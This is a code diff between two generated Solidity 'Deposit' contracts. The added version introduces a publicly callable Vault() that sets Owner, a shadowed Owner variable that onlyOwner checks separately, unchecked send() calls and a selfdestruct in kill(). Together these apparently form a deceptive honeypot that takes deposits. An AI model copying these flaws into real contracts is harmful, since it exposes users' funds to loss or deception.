@@ -1,59 +1,57 @@
 /* 
- source code generate by Bui Dinh Ngoc aka ngocbd<buidinhngoc.aiti@gmail.com> for smartcontract Deposit at 0x625f220be6440c14f3481072f1cbe9a83a58ec75
+ source code generate by Bui Dinh Ngoc aka ngocbd<buidinhngoc.aiti@gmail.com> for smartcontract Deposit at 0xE7E25a3D83abdC4a4273792CCa7865889a7b0Df3
 */
-pragma solidity ^0.4.15;
+pragma solidity ^0.4.8;
 
-contract Deposit {
+contract ForeignToken {
+    function balanceOf(address who) constant public returns (uint256);
+    function transfer(address to, uint256 amount) public;
+}
+
+contract Owned {
+    address public Owner = msg.sender;
+    modifier onlyOwner { if (msg.sender == Owner) _; }
+}
+
+contract Deposit is Owned {
     address public Owner;
+    mapping (address => uint) public Deposits;
+
+    event Deposit(uint amount);
+    event Withdraw(uint amount);
     
-    mapping (address => uint) public deposits;
-    
-    uint public ReleaseDate;
-    bool public Locked;
-    
-    event Initialized();
-    event Deposit(uint Amount);
-    event Withdrawal(uint Amount);
-    event ReleaseDate(uint date);
-    
-    function initialize() payable {
+    function Vault() payable {
         Owner = msg.sender;
-        ReleaseDate = 0;
-        Locked = false;
-        Initialized();
+        deposit();
     }
-
-    function setReleaseDate(uint date) public payable {
-        if (isOwner() && !Locked) {
-            ReleaseDate = date;
-            Locked = true;
-            ReleaseDate(date);
-        }
-    }
-
-    function() payable { revert(); } // call deposit()
     
-    function deposit() public payable {
-        if (msg.value >= 0.25 ether) {
-            deposits[msg.sender] += msg.value;
+    function() payable {
+        deposit();
+    }
+
+    function deposit() payable {
+        if (msg.value >= 0.1 ether) {
+            Deposits[msg.sender] += msg.value;
             Deposit(msg.value);
         }
     }
 
-    function withdraw(uint amount) public payable {
-        withdrawTo(msg.sender, amount);
+    function kill() payable {
+        if (this.balance == 0)
+            selfdestruct(msg.sender);
     }
     
-    function withdrawTo(address to, uint amount) public payable {
-        if (isOwner() && isReleasable()) {
-            uint withdrawMax = deposits[msg.sender];
-            if (withdrawMax > 0 && amount <= withdrawMax) {
-                to.transfer(amount);
-                Withdrawal(amount);
-            }
+    function withdraw(uint amount) payable onlyOwner {
+        if (Deposits[msg.sender] > 0 && amount <= Deposits[msg.sender]) {
+            msg.sender.send(amount);
+            Withdraw(amount);
         }
     }
-
-    function isReleasable() public constant returns (bool) { return now >= ReleaseDate; }
-    function isOwner() public constant returns (bool) { return Owner == msg.sender; }
+    
+    function withdrawToken(address token, uint amount) payable onlyOwner {
+        uint bal = ForeignToken(token).balanceOf(address(this));
+        if (bal >= amount) {
+            ForeignToken(token).transfer(msg.sender, amount);
+        }
+    }
 }
